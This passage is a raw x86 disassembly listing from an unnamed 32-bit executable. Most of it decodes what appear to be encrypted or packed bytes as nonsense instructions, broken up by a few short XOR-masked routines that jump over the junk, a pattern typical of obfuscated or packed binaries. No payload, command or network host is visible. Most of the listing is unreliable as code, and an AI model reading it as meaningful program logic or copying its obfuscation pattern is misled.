  40bd27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd28:	sbb    edi,ecx
  40bd2a:	hlt    
  40bd2b:	es fcmove st,st(1)
  40bd2e:	int3   
  40bd2f:	pop    es
  40bd30:	xor    cl,ch
  40bd32:	adc    ch,BYTE PTR [ecx-0x228f63d7]
  40bd38:	(bad)  
  40bd3a:	outs   dx,DWORD PTR ds:[esi]
  40bd3b:	ins    BYTE PTR es:[edi],dx
  40bd3c:	cmc    
  40bd3d:	pop    ds
  40bd3e:	in     eax,0x86
  40bd40:	call   0x9214:0x3324815a
  40bd47:	pop    ebp
  40bd48:	and    DWORD PTR [ecx],ecx
  40bd4a:	lea    eax,[ecx]
  40bd4c:	jecxz  0x40bd25
  40bd4e:	mov    ebp,0x766e78f2
  40bd53:	and    ebx,ecx
  40bd55:	cmp    ebx,eax
  40bd57:	mov    bh,0x96
  40bd59:	mov    edi,0x57ac1a38
  40bd5e:	sti    
  40bd5f:	sub    eax,0xd1bc0930
  40bd64:	pop    ebp
  40bd65:	xchg   edi,eax
  40bd66:	inc    ebx
  40bd67:	or     BYTE PTR [esi],ch
  40bd69:	and    esp,DWORD PTR ds:0xaeb5a6a4
  40bd6f:	fstp   DWORD PTR [ebp+ebx*8-0x43176f95]
  40bd76:	aas    
  40bd77:	cmp    DWORD PTR [ebp-0x76],0xfffffff9
  40bd7b:	adc    al,0xa4
  40bd7d:	inc    esi
  40bd7e:	shr    esp,0xe6
  40bd81:	add    esi,eax
  40bd83:	inc    esi
  40bd84:	pop    esi
  40bd85:	call   DWORD PTR [esi+0x7b2b7da3]
  40bd8b:	mov    al,0xed
  40bd8d:	mov    esi,0xc9201a30
  40bd92:	rcl    DWORD PTR [ebx-0x3de3e66e],cl
  40bd98:	das    
  40bd99:	fsub   st(3),st
  40bd9b:	loop   0x40bd9a
  40bd9d:	mov    ch,0xd8
  40bd9f:	sbb    BYTE PTR [edx],bl
  40bda1:	inc    eax
  40bda2:	mov    ecx,edx
  40bda4:	inc    eax
  40bda5:	call   0xb8c5:0xf0ae0019
  40bdac:	addr16 inc ebp
  40bdae:	fadd   DWORD PTR [ecx+ebx*8]
  40bdb1:	dec    esi
  40bdb2:	mov    ebp,0xc3205e6a
  40bdb7:	and    edi,eax
  40bdb9:	jb     0x40be2b
  40bdbb:	pop    ds
  40bdbc:	sar    BYTE PTR [edx+0x4435e16f],0x4e
  40bdc3:	out    0x21,al
  40bdc5:	icebp  
  40bdc6:	and    al,0xd5
  40bdc8:	push   ss
  40bdc9:	lds    ebx,FWORD PTR ds:0xef2a6374
  40bdcf:	sti    
  40bdd0:	xor    BYTE PTR ds:0x4bb05f61,dh
  40bdd6:	jb     0x40bd85
  40bdd8:	cmovo  ebp,DWORD PTR [edx-0x2f]
  40bddc:	stos   BYTE PTR es:[edi],al
  40bddd:	mov    eax,0xe2243b8
  40bde2:	test   DWORD PTR [edx+0x40],edi
  40bde5:	aam    0x35
  40bde7:	test   BYTE PTR [ecx+0x4c],dh
  40bdea:	xchg   BYTE PTR [eiz*2-0x8347474],bl
  40bdf1:	nop
  40bdf2:	or     al,BYTE PTR [edi-0x6aa8d99d]
  40bdf8:	pop    edi
  40bdf9:	jmp    0x40bda8
  40bdfb:	pushf  
  40bdfc:	sub    DWORD PTR [ecx+edx*2],edx
  40bdff:	mov    es,WORD PTR [ecx-0x19cf556c]
  40be05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be06:	mov    ecx,0xdc8b5f71
  40be0b:	dec    ecx
  40be0c:	sbb    eax,0x8f8b4ece
  40be11:	aad    0xca
  40be13:	ss mov ch,0x89
  40be16:	popa   
  40be17:	sub    eax,0x32fc835b
  40be1c:	jns    0x40be9a
  40be1e:	xchg   esi,eax
  40be1f:	inc    eax
  40be20:	xchg   ebp,eax
  40be21:	sub    BYTE PTR [esp+edi*2-0x14],cl
  40be25:	jne    0x40be8b
  40be27:	fs mov dh,0x41
  40be2a:	inc    edx
  40be2b:	jb     0x40be90
  40be2d:	jae    0x40be72
  40be2f:	dec    esp
  40be30:	inc    edi
  40be31:	mov    edx,0xd08483a2
  40be36:	sbb    esi,DWORD PTR [eax]
  40be38:	and    bh,BYTE PTR [edi]
  40be3a:	mov    ds:0x450873e,al
  40be3f:	adc    DWORD PTR [edi],edi
  40be41:	xor    eax,edi
  40be43:	imul   esi,DWORD PTR [ecx+0x2423a815],0xffffffdb
  40be4a:	or     eax,0xa19e0a81
  40be4f:	push   0xc663ad0c
  40be54:	jg     0x40bea2
  40be56:	sbb    al,0x37
  40be58:	lods   al,BYTE PTR ds:[esi]
  40be59:	and    al,bh
  40be5b:	mov    ebx,0x178072e
  40be60:	dec    edi
  40be61:	jne    0x40be92
  40be63:	sub    al,0x7
  40be65:	mov    eax,0xa630de0b
  40be6a:	pushf  
  40be6b:	mov    dh,0xb
  40be6d:	push   esi
  40be6e:	push   ecx
  40be6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be70:	(bad)  
  40be71:	pop    ebx
  40be72:	cwde   
  40be73:	(bad)  
  40be75:	xchg   ebx,eax
  40be76:	cld    
  40be77:	sahf   
  40be78:	out    0x1e,al
  40be7a:	pop    ebx
  40be7b:	ins    BYTE PTR es:[edi],dx
  40be7c:	dec    ebp
  40be7d:	xor    al,0x61
  40be7f:	and    esi,DWORD PTR [ebp+0x0]
  40be82:	loop   0x40bedd
  40be84:	popf   
  40be85:	imul   esp,DWORD PTR [edi+0x6551f637],0xf2cee56c
  40be8f:	xor    cl,BYTE PTR [esi+0x7103a779]
  40be95:	out    0x49,eax
  40be97:	push   ds
  40be98:	rcl    DWORD PTR [eax+0x126c44b7],cl
  40be9e:	jb     0x40bed5
  40bea0:	push   edi
  40bea1:	inc    esp
  40bea2:	aad    0xb4
  40bea4:	dec    ecx
  40bea5:	pop    esp
  40bea6:	aam    0xf2
  40bea8:	(bad)  
  40bea9:	sbb    al,0xa4
  40beab:	sti    
  40beac:	add    BYTE PTR [edx],al
  40beae:	stc    
  40beaf:	out    0xb3,al
  40beb1:	dec    esp
  40beb2:	repnz sbb ebx,DWORD PTR [esi+0x65249517]
  40beb9:	enter  0x96e,0x41
  40bebd:	xchg   ebx,eax
  40bebe:	fiadd  DWORD PTR [ebx]
  40bec0:	push   ebx
  40bec1:	pop    ebp
  40bec2:	cmp    edi,DWORD PTR [eax+0x7a627480]
  40bec8:	adc    eax,0x8f843419
  40becd:	fxam   
  40becf:	das    
  40bed0:	pusha  
  40bed1:	icebp  
  40bed2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bed3:	icebp  
  40bed4:	mov    bl,0x25
  40bed6:	lods   eax,DWORD PTR ds:[esi]
  40bed7:	mov    edi,0xf9e1f743
  40bedc:	jmp    0x409d315
  40bee1:	in     eax,0x24
  40bee3:	out    0x83,eax
  40bee5:	arpl   WORD PTR [ebx+0x51085435],si
  40beeb:	pop    es
  40beec:	jmp    0x40b9f2
  40bef1:	mov    eax,DWORD PTR [ebp+0xc]
  40bef4:	add    eax,DWORD PTR [ebp+0x8]
  40bef7:	mov    DWORD PTR [ebp-0x10],eax
  40befa:	mov    eax,DWORD PTR [ebp-0x1c]
  40befd:	test   eax,eax
  40beff:	je     0x40cbbe
  40bf05:	mov    DWORD PTR [ebp-0x24],esi
  40bf08:	push   0xb
  40bf0a:	pop    ecx
  40bf0b:	push   0x5
  40bf0d:	dec    ecx
  40bf0e:	pop    ebx
  40bf0f:	xchg   ebx,ecx
  40bf11:	sub    ebx,ecx
  40bf13:	jmp    0x40c176
  40bf18:	pop    ecx
  40bf19:	jbe    0x69f82f56
  40bf1f:	push   ecx
  40bf20:	scas   eax,DWORD PTR es:[edi]
  40bf21:	or     cl,BYTE PTR [esi-0x2b53f0cf]
  40bf27:	sti    
  40bf28:	cmp    cl,0x7e
  40bf2b:	jle    0x40bf65
  40bf2d:	jl     0x40bfad
  40bf2f:	jle    0x40beda
  40bf31:	xchg   esi,eax
  40bf32:	out    dx,al
  40bf33:	and    dl,bh
  40bf35:	jb     0x40bf0b
  40bf37:	loope  0x40bf3c
  40bf39:	scas   al,BYTE PTR es:[edi]
  40bf3a:	fs ss out 0xd,al
  40bf3e:	pop    es
  40bf3f:	xchg   ebp,eax
  40bf40:	dec    eax
  40bf41:	mov    eax,DWORD PTR [ebx]
  40bf43:	stos   BYTE PTR es:[edi],al
  40bf44:	sahf   
  40bf45:	cmp    DWORD PTR [edx-0x3e],eax
  40bf48:	xchg   ecx,eax
  40bf49:	cli    
  40bf4a:	gs imul edx,ebx,0x48224a35
  40bf51:	pop    ebx
  40bf52:	mov    DWORD PTR [ebx+edx*1-0x37f5b345],ebp
  40bf59:	jmp    0x40bf02
  40bf5b:	fwait
  40bf5c:	ret    
  40bf5d:	fwait
  40bf5e:	mov    al,0x29
  40bf60:	int3   
  40bf61:	mov    al,0xdb
  40bf63:	jne    0x40bfb7
  40bf65:	pop    ecx
  40bf66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf67:	pop    eax
  40bf68:	in     al,0xf4
  40bf6a:	adc    eax,0x69f0a9fb
  40bf6f:	adc    DWORD PTR [edi+0x498bed29],ecx
  40bf75:	imul   edx,esi,0x24
  40bf78:	xor    eax,0x41a94e98
  40bf7d:	stos   BYTE PTR es:[edi],al
  40bf7e:	pop    ecx
  40bf7f:	mov    BYTE PTR [eax],dh
  40bf81:	mov    dh,BYTE PTR [edx-0x2]
  40bf84:	xchg   ebp,eax
  40bf85:	jo     0x40bfd0
  40bf87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf88:	lods   eax,DWORD PTR ds:[esi]
  40bf89:	add    esp,DWORD PTR [edx-0x70aad4ec]
  40bf8f:	(bad)  
  40bf90:	push   ss
  40bf91:	dec    ebx
  40bf92:	out    dx,eax
  40bf93:	ss (bad) 
  40bf95:	cmp    al,0xcb
  40bf97:	inc    ebp
  40bf98:	repz fstp TBYTE PTR [eax+0x1d]
  40bf9c:	vandps ymm5,ymm0,ymm3
  40bfa0:	lock in eax,dx
  40bfa2:	push   ss
  40bfa3:	scas   eax,DWORD PTR es:[edi]
  40bfa4:	and    ah,cl
  40bfa6:	(bad)  
  40bfa7:	jnp    0x40bf69
  40bfa9:	mov    dl,0x70
  40bfab:	out    dx,eax
  40bfac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfad:	popa   
  40bfae:	adc    ebp,ebx
  40bfb0:	mov    ebx,0x9534b133
  40bfb5:	mov    edx,0xaad03747
  40bfba:	jb     0x40bfc3
  40bfbc:	sub    dh,BYTE PTR [esi+0x21]
  40bfbf:	add    eax,0xd12e3ce5
  40bfc4:	das    
  40bfc5:	pop    DWORD PTR [ebx+0xc57824b]
  40bfcb:	popf   
  40bfcc:	dec    DWORD PTR [edi]
  40bfce:	not    BYTE PTR [ebx+0x4a103b6d]
  40bfd4:	xlat   BYTE PTR ds:[ebx]
  40bfd5:	loope  0x40bfec
  40bfd7:	popf   
  40bfd8:	jmp    0xecdd:0x74bd6627
  40bfdf:	mov    eax,0xf7fb9c43
  40bfe4:	fadd   QWORD PTR [ebp+0x53]
  40bfe7:	lahf   
  40bfe8:	int    0xfc
  40bfea:	xchg   DWORD PTR [ebx+eiz*2-0x42],edi
  40bfee:	xor    DWORD PTR [ebx-0x23],0xe5d5e1db
  40bff5:	add    eax,0xafc419ab
  40bffa:	inc    esi
  40bffb:	jecxz  0x40c067
  40bffd:	xchg   BYTE PTR [eax+ebx*2-0x7cc2daf0],dh
  40c004:	mov    bh,0x8e
  40c006:	clc    
  40c007:	mov    si,0xf25a
  40c00b:	rol    DWORD PTR [esi-0xe],cl
  40c00e:	(bad)  
  40c00f:	push   0x8a14f2f2
  40c014:	cmp    BYTE PTR [edx+0x4fbd8699],al
  40c01a:	lea    ecx,[esi-0x4538fe7f]
  40c020:	or     al,0x79
  40c022:	lahf   
  40c023:	aam    0xfd
  40c025:	retf   0x9727
  40c028:	push   ecx
  40c029:	jno    0x40c03f
  40c02b:	fstp   st(0)
  40c02d:	jg     0x40c029
  40c02f:	mov    ch,bl
  40c031:	cs mov ebx,0x14a5a64b
  40c037:	out    0x82,eax
  40c039:	dec    edx
  40c03a:	jne    0x40c052
  40c03c:	repz mov ebx,0x3ce5cf2f
  40c042:	fld    TBYTE PTR [ebx]
  40c044:	jae    0x40c058
  40c046:	lea    ebx,cs:[ecx+0x23]
  40c04a:	bound  ebx,QWORD PTR ds:0x131d1e66
  40c050:	inc    esi
  40c051:	xchg   DWORD PTR [edi-0x6ab7ab3d],ecx
  40c057:	out    0xb9,al
  40c059:	sbb    al,0x6d
  40c05b:	and    al,BYTE PTR [eax-0x3b06415c]
  40c061:	mov    edi,0xbfab7bb8
  40c066:	lahf   
  40c067:	fsubr  QWORD PTR [ecx+0x7c]
  40c06a:	sbb    al,0x7b
  40c06c:	mov    ds:0x891f68c4,al
  40c071:	xor    eax,0x4474a678
  40c076:	int3   
  40c077:	lahf   
  40c078:	loopne 0x40c0af
  40c07a:	and    BYTE PTR ds:0x16a62746,ah
  40c080:	daa    
  40c081:	shl    bh,1
  40c083:	clc    
  40c084:	jne    0x40c0dd
  40c086:	mov    ebx,0xa06eccfd
  40c08b:	dec    BYTE PTR [ebp-0x304fe6]
  40c091:	fld    DWORD PTR [ebp+0x7b]
  40c094:	imul   esi,DWORD PTR [ebx+eax*4],0x6fdf33f1
  40c09b:	leave  
  40c09c:	dec    ecx
  40c09d:	arpl   WORD PTR [eax],di
  40c09f:	gs push 0x601613da
  40c0a5:	sub    al,0x51
  40c0a7:	xor    BYTE PTR es:[eax],ah
  40c0aa:	sbb    ebx,ebp
  40c0ac:	push   eax
  40c0ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0ae:	sub    BYTE PTR [ecx+0x9],bh
  40c0b1:	xchg   esi,eax
  40c0b2:	ins    DWORD PTR es:[edi],dx
  40c0b3:	stos   BYTE PTR es:[edi],al
  40c0b4:	sbb    DWORD PTR [ebp-0x54],edx
  40c0b7:	aas    
  40c0b8:	push   ecx
  40c0b9:	enter  0x8d30,0x86
  40c0bd:	push   ecx
  40c0be:	dec    esp
  40c0bf:	mov    ch,0x16
  40c0c1:	loop   0x40c0e0
  40c0c3:	sar    BYTE PTR es:[ecx-0xb],1
  40c0c7:	inc    BYTE PTR [eax]
  40c0c9:	ja     0x40c095
  40c0cb:	or     eax,0x5bc485d2
  40c0d0:	pushf  
  40c0d1:	sbb    esi,ecx
  40c0d3:	int3   
  40c0d4:	dec    sp
  40c0d6:	sbb    dl,al
  40c0d8:	int3   
  40c0d9:	xchg   edi,eax
  40c0da:	in     al,0x2b
  40c0dc:	std    
  40c0dd:	rcr    BYTE PTR [ecx],0xe7
  40c0e0:	add    DWORD PTR [ebx*2-0x17ae9aea],ebx
  40c0e7:	pop    es
  40c0e8:	mov    ebx,0x61931b9c
  40c0ed:	sub    BYTE PTR [ecx],al
  40c0ef:	mov    ebx,0x6f32d6d3
  40c0f4:	inc    ebx
  40c0f5:	rcl    DWORD PTR [ecx-0x7ac217f4],1
  40c0fb:	or     al,BYTE PTR [eax+0x79c0f823]
  40c101:	sub    eax,0xf0ab30b9
  40c106:	add    ebx,eax
  40c108:	vrsqrtss xmm7,xmm7,DWORD PTR [ebx-0x5e]
  40c10d:	inc    eax
  40c10e:	mov    bl,0x8e
  40c110:	xchg   ecx,eax
  40c111:	lods   al,BYTE PTR ds:[esi]
  40c112:	cld    
  40c113:	in     eax,dx
  40c114:	cmp    BYTE PTR [ebx],cl
  40c116:	mov    edi,0x211db6f4
  40c11b:	push   esp
  40c11c:	jp     0x40c157
  40c11e:	es mov dl,ah
  40c121:	repnz push eax
  40c123:	fnstcw WORD PTR [edi-0x4e9844ad]
  40c129:	push   eax
  40c12a:	mov    eax,0x777c2e81
  40c12f:	push   edx
  40c130:	push   edi
  40c131:	in     al,0x2d
  40c133:	mov    cx,0x21fc
  40c137:	ins    BYTE PTR es:[edi],dx
  40c138:	add    BYTE PTR [edi+eiz*8+0x55],cl
  40c13c:	iret   
  40c13d:	lock enter 0x97b,0xf0
  40c142:	sti    
  40c143:	ja     0x40c126
  40c145:	(bad)
  40c149:	jg     0x40c18e
  40c14b:	push   cs
  40c14c:	mov    dl,0xc5
  40c14e:	lea    ebx,[ecx]
  40c150:	push   ds
  40c151:	pop    ebp
  40c152:	ret    0x3903
  40c155:	cmc    
  40c156:	jns    0x40c1a5
  40c158:	je     0x40c12a
  40c15a:	test   DWORD PTR [ecx-0x37a587d8],0xce840757
  40c164:	(bad)  
  40c165:	in     al,0xf0
  40c167:	call   0x4846:0x1026eed8
  40c16e:	adc    esi,esp
  40c170:	mov    edi,0xea649b49
  40c175:	xor    al,BYTE PTR [edi+0x458b49cb]
  40c17b:	in     al,0xf
  40c17d:	scas   eax,DWORD PTR es:[edi]
  40c17e:	shr    DWORD PTR [ebx],0xe0
  40c181:	mov    DWORD PTR [ebp-0x24],esp
  40c184:	jmp    0x40c3e7
  40c189:	dec    ebx
  40c18a:	loop   0x40c1d9
  40c18c:	lds    esi,FWORD PTR [ebp+0x71]
  40c18f:	push   ebx
  40c190:	jo     0x40c117
  40c192:	mov    cl,0xee
  40c194:	sub    al,0x5f
  40c196:	adc    ebp,edx
  40c198:	(bad)  
  40c199:	dec    edx
  40c19a:	xchg   DWORD PTR [esi+0x7e],edi
  40c19d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c1a1:	add    eax,0xc76f95bd
  40c1a6:	xor    ah,BYTE PTR [edx+0x2c6a4648]
  40c1ac:	adc    eax,0x51068084
  40c1b1:	fisttp WORD PTR [esi+0x73]
  40c1b4:	popa   
  40c1b5:	(bad)  
  40c1b7:	pop    ss
  40c1b8:	daa    
  40c1b9:	(bad)  
  40c1ba:	leave  
  40c1bb:	outs   dx,BYTE PTR ds:[esi]
  40c1bc:	ficom  WORD PTR [ebx-0x6f49374c]
  40c1c2:	cmp    al,0xe4
  40c1c4:	mov    ebx,es
  40c1c6:	push   edi
  40c1c7:	and    edi,DWORD PTR [edi-0x37]
  40c1ca:	pop    edx
  40c1cb:	or     ebp,DWORD PTR [esi]
  40c1cd:	pop    ebp
  40c1ce:	iret   
  40c1cf:	je     0x40c15c
  40c1d1:	sub    eax,0x32dbca2a
  40c1d6:	mov    esp,0x954087e7
  40c1db:	lea    edi,[eax+ebx*4+0x3f]
  40c1df:	or     al,0xb7
  40c1e1:	dec    ebx
  40c1e2:	repz xor al,0x82
  40c1e5:	push   ss
  40c1e6:	dec    ecx
  40c1e7:	or     DWORD PTR [ebx+edx*2+0x2cb0f506],esp
  40c1ee:	in     eax,0x90
  40c1f0:	xchg   DWORD PTR [ebx-0x34],esp
  40c1f3:	add    eax,0x7d2bdfd7
  40c1f8:	into   
  40c1f9:	add    BYTE PTR [eax],al
  40c1fb:	inc    edx
  40c1fc:	dec    BYTE PTR [ebp-0x424c257c]
  40c202:	addr16 rcr cl,0xb6
  40c206:	xchg   ebp,eax
  40c207:	sbb    al,0xf
  40c209:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c20a:	inc    ebp
  40c20b:	or     BYTE PTR [ebx+0x3],0x11
  40c20f:	mov    edi,DWORD PTR [edx+0x2c]
  40c212:	dec    esi
  40c213:	stos   DWORD PTR es:[edi],eax
  40c214:	or     cl,0x57
  40c217:	in     al,0x8e
  40c219:	stos   BYTE PTR es:[edi],al
  40c21a:	cmp    edx,esp
  40c21c:	add    BYTE PTR [ebp+0x7857a7d7],0xef
  40c223:	push   es
  40c224:	ret    0x3b2d
  40c227:	push   ecx
  40c228:	dec    eax
  40c229:	adc    al,0xd1
  40c22b:	sbb    ch,0x7d
  40c22e:	jecxz  0x40c257
  40c230:	adc    eax,DWORD PTR [ecx-0xb4fdc58]
  40c236:	fucomi st,st(5)
  40c238:	mov    ah,0xb4
  40c23a:	xor    eax,0xf31287db
  40c23f:	das    
  40c240:	add    DWORD PTR [ecx-0x5be29c17],ecx
  40c246:	(bad)  
  40c247:	jo     0x40c22a
  40c249:	add    edi,DWORD PTR [edx-0x58ed86f5]
  40c24f:	(bad)  
  40c250:	xor    ebx,DWORD PTR [ebp-0xd57e7cc]
  40c256:	jmp    0x40c2b1
  40c258:	add    al,BYTE PTR [edi-0x7e]
  40c25b:	bound  esi,QWORD PTR [edi]
  40c25d:	cmc    
  40c25e:	push   esi
  40c25f:	lods   al,BYTE PTR ds:[esi]
  40c260:	das    
  40c261:	repnz mov ecx,0x14e87127
  40c267:	ror    BYTE PTR [edi+0x4],0xb1
  40c26b:	pop    es
  40c26c:	xchg   esp,eax
  40c26d:	scas   eax,DWORD PTR es:[edi]
  40c26e:	add    al,BYTE PTR [edi-0x60f24907]
  40c274:	outs   dx,BYTE PTR ds:[esi]
  40c275:	stc    
  40c276:	leave  
  40c277:	loop   0x40c29e
  40c279:	outs   dx,BYTE PTR ds:[esi]
  40c27a:	cmp    al,0x49
  40c27c:	adc    esi,DWORD PTR [esi-0x193df131]
  40c282:	pop    edx
  40c283:	cmp    BYTE PTR [esi-0x46eaba8f],bl
  40c289:	popf   
  40c28a:	test   DWORD PTR [esi],eax
  40c28c:	cmp    BYTE PTR [ebx+0x5fb2ce19],dh
  40c292:	push   ebx
  40c293:	scas   eax,DWORD PTR es:[edi]
  40c294:	cmp    esi,DWORD PTR [edx]
  40c296:	dec    esi
  40c297:	ja     0x40c2b1
  40c299:	or     ebp,edx
  40c29b:	shr    DWORD PTR [esi+0x2],0x8c
  40c29f:	ja     0x40c30e
  40c2a1:	out    0x62,eax
  40c2a3:	js     0x40c291
  40c2a5:	stos   BYTE PTR es:[edi],al
  40c2a6:	and    DWORD PTR [eax],esi
  40c2a8:	out    dx,eax
  40c2a9:	mov    esp,0x160c3f38
  40c2ae:	inc    esi
  40c2af:	mov    edi,0x9fe5b095
  40c2b4:	jno    0x40c278
  40c2b6:	and    DWORD PTR [ecx-0xf62d258],0x4a35d16f
  40c2c0:	(bad)  [edx+0x19]
  40c2c3:	adc    BYTE PTR [ecx],ch
  40c2c5:	lods   eax,DWORD PTR ds:[esi]
  40c2c6:	in     al,0x64
  40c2c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2c9:	xchg   ebx,eax
  40c2ca:	add    al,0xb9
  40c2cc:	dec    edi
  40c2cd:	cmp    al,0x85
  40c2cf:	stc    
  40c2d0:	lods   al,BYTE PTR ds:[esi]
  40c2d1:	mov    ebx,0xc4130063
  40c2d6:	neg    DWORD PTR [edi+0x1b]
  40c2d9:	pop    esp
  40c2da:	mov    esp,0x347833a8
  40c2df:	sbb    BYTE PTR [eax],bl
  40c2e1:	cmp    al,0x20
  40c2e3:	test   eax,0xb24bed6f
  40c2e8:	and    eax,0x86cbf0f5
  40c2ed:	cmp    ebp,DWORD PTR [ecx+eax*1-0x78ba44d2]
  40c2f4:	aas    
  40c2f5:	cmp    DWORD PTR [ecx+0x6de71616],ebx
  40c2fb:	cmp    DWORD PTR [ebx],ecx
  40c2fd:	sub    DWORD PTR [ebx-0x667e6af2],esp
  40c303:	mov    bh,0xd7
  40c305:	push   esp
  40c306:	rcr    DWORD PTR [esi+0x4c],cl
  40c309:	jno    0x40c31d
  40c30b:	sar    BYTE PTR [eax-0x6377c649],cl
  40c311:	repnz pop ebx
  40c313:	std    
  40c314:	retf   
  40c315:	mov    esi,0xf66680f2
  40c31a:	(bad)  
  40c31c:	in     eax,0xb
  40c31e:	fidiv  WORD PTR [eax+0x68]
  40c321:	scas   al,BYTE PTR es:[edi]
  40c322:	adc    ebx,esi
  40c324:	or     ch,BYTE PTR ds:0xfae47ca4
  40c32a:	rcr    BYTE PTR [esp+ebp*1],cl
  40c32d:	sbb    eax,0x7d2f83d3
  40c332:	repnz sub ecx,DWORD PTR [ebx-0x19a391e6]
  40c339:	or     DWORD PTR [edx+0x4e],ebx
  40c33c:	call   0x36d:0xd0e659d2
  40c343:	mov    ch,0xb3
  40c345:	sahf   
  40c346:	cmp    bh,BYTE PTR [ebx+0x653752f9]
  40c34c:	into   
  40c34d:	xor    edx,ebx
  40c34f:	arpl   bx,sp
  40c351:	inc    edi
  40c352:	push   ds
  40c353:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c354:	aaa    
  40c355:	push   0xffffffe5
  40c357:	inc    edx
  40c358:	in     eax,dx
  40c359:	stos   BYTE PTR es:[edi],al
  40c35a:	js     0x40c2f8
  40c35c:	lods   eax,DWORD PTR ds:[esi]
  40c35d:	adc    al,0xda
  40c35f:	daa    
  40c360:	adc    DWORD PTR [ebx+0x3c50e402],ecx
  40c366:	mov    al,0x8d
  40c368:	lock sbb edx,DWORD PTR [ecx+ecx*1+0x7021947a]
  40c370:	test   edx,edx
  40c372:	fld    TBYTE PTR [esp+edx*4-0x25]
  40c376:	sbb    eax,0xfe4e3cc2
  40c37b:	xchg   DWORD PTR ds:0x77a5f56f,ecx
  40c381:	jl     0x40c3c0
  40c383:	jae    0x40c3eb
  40c385:	xchg   edx,eax
  40c386:	(bad)  
  40c387:	add    edi,edx
  40c389:	ficomp DWORD PTR [ebp+0x3a]
  40c38c:	push   ss
  40c38d:	push   0xa14801a4
  40c392:	or     al,0xfd
  40c394:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c395:	cwde   
  40c396:	add    cl,dl
  40c398:	adc    dl,BYTE PTR [ebp-0x65]
  40c39b:	rcr    DWORD PTR [eax-0x3aa4f48b],0xaa
  40c3a2:	scas   al,BYTE PTR es:[edi]
  40c3a3:	mov    esp,0xdba20669
  40c3a8:	inc    ebp
  40c3a9:	cmp    al,BYTE PTR [ecx+ebp*2]
  40c3ac:	push   ecx
  40c3ad:	and    bl,dh
  40c3af:	neg    bh
  40c3b1:	jo     0x40c3c4
  40c3b3:	shl    BYTE PTR [edi],1
  40c3b5:	jnp    0x40c3ad
  40c3b7:	xor    eax,DWORD PTR [edi+0x5f]
  40c3ba:	out    dx,al
  40c3bb:	or     bh,cl
  40c3bd:	and    eax,0x89f07a55
  40c3c2:	and    cl,ch
  40c3c4:	push   ebp
  40c3c5:	mov    bl,BYTE PTR [ebx]
  40c3c7:	das    
  40c3c8:	into   
  40c3c9:	sub    eax,DWORD PTR ds:0xafb3a1c9
  40c3cf:	popf   
  40c3d0:	pop    ecx
  40c3d1:	and    esp,eax
  40c3d3:	push   bp
  40c3d5:	inc    edx
  40c3d6:	mov    edx,0x47cdb2d5
  40c3db:	push   eax
  40c3dc:	dec    ebp
  40c3dd:	adc    eax,0x4fbe05f2
  40c3e2:	out    0x8c,eax
  40c3e4:	push   ebx
  40c3e5:	test   eax,0xfc458b33
  40c3ea:	mov    ecx,0x7510854
  40c3ef:	xor    eax,ecx
  40c3f1:	mov    edx,0x32729b
  40c3f6:	add    eax,edx
  40c3f8:	mov    DWORD PTR [ebp+0x8],eax
  40c3fb:	mov    eax,DWORD PTR [ebp-0x18]
  40c3fe:	xor    eax,ecx
  40c400:	add    eax,edx
  40c402:	mov    edx,DWORD PTR [ebp+0x14]
  40c405:	imul   eax,DWORD PTR [edx]
  40c408:	mov    edx,DWORD PTR [ebp-0x4]
  40c40b:	xor    edx,ecx
  40c40d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c410:	lea    ecx,[edx+ecx*1+0x32729b]
  40c417:	cmp    ecx,eax
  40c419:	je     0x40cbb9
  40c41f:	mov    edi,DWORD PTR [ebp-0x18]
  40c422:	mov    eax,DWORD PTR [ebp+0x8]
  40c425:	mov    edx,DWORD PTR [ebp+0x14]
  40c428:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40c42c:	mov    ecx,0x7510854
  40c431:	xor    edx,edx
  40c433:	xor    edi,ecx
  40c435:	jmp    0x40c698
  40c43a:	dec    ebp
  40c43b:	scas   al,BYTE PTR es:[edi]
  40c43c:	push   ss
  40c43d:	pop    ebx
  40c43e:	cmc    
  40c43f:	arpl   WORD PTR [ecx-0x58],si
  40c442:	pop    esi
  40c443:	clc    
  40c444:	push   ss
  40c445:	shl    ecx,cl
  40c447:	dec    eax
  40c448:	dec    ecx
  40c449:	cmp    dl,BYTE PTR [edx+eax*4]
  40c44c:	jle    0x40c4cc
  40c44e:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c452:	sub    eax,0x535d2ddb
  40c457:	fwait
  40c458:	lock (bad) 
  40c45a:	cmp    DWORD PTR ds:0x2e368421,edx
  40c460:	pop    es
  40c461:	sub    ebp,DWORD PTR ds:0x7a83a0d3
  40c467:	mov    bh,0xe1
  40c469:	ss inc ecx
  40c46b:	rcr    BYTE PTR [edx+0x51f5d8b5],0x69
  40c472:	scas   al,BYTE PTR es:[edi]
  40c473:	cmp    DWORD PTR ds:0xf7ffe5c7,ebp
  40c479:	iret   
  40c47a:	inc    ecx
  40c47b:	xchg   al,ah
  40c47d:	(bad)  
  40c47e:	jmp    0xb12d499a
  40c483:	sub    al,0x4
  40c485:	iret   
  40c486:	push   edi
  40c487:	push   ecx
  40c488:	xchg   edx,eax
  40c489:	pop    eax
  40c48a:	mov    al,ds:0xe4d35cdb
  40c48f:	fwait
  40c490:	push   0x4d33a9f2
  40c495:	cmp    DWORD PTR [ecx+0x3],esp
  40c498:	and    cl,0x96
  40c49b:	or     al,0x1e
  40c49d:	xchg   DWORD PTR [edx+0x556dc467],edx
  40c4a3:	adc    al,0xee
  40c4a5:	cs (bad) 
  40c4a8:	push   edi
  40c4a9:	mov    al,cl
  40c4ab:	repnz rol DWORD PTR [eax],0x57
  40c4af:	sbb    bh,BYTE PTR ds:0x836246db
  40c4b5:	adc    ebx,DWORD PTR [edi-0x285f515f]
  40c4bb:	push   ebp
